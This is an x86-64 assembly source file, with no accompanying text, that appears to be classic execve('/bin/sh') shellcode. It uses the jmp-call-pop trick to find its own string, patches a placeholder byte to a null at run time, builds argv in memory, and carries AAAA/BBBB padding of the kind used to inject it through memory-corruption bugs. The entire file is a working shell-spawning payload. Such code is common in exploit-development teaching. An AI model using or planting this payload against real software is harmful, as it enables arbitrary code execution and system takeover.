section .text
global _start

_start:
    BITS 64
    jmp short two

one:
    pop rbx

    ; NULL-terminate "/bin/sh"
    xor rax, rax
    mov byte [rbx+7], al

    ; argv[0] = "/bin/sh"
    mov [rbx+8], rbx

    ; argv[1] = NULL
    mov [rbx+16], rax

    ; filename
    mov rdi, rbx

    ; argv
    lea rsi, [rbx+8]

    ; envp = NULL
    xor rdx, rdx

    ; execve syscall
    mov al, 59
    syscall

two:
    call one
    db '/bin/sh', 0xFF
    db 'AAAAAAAA'
    db 'BBBBBBBB'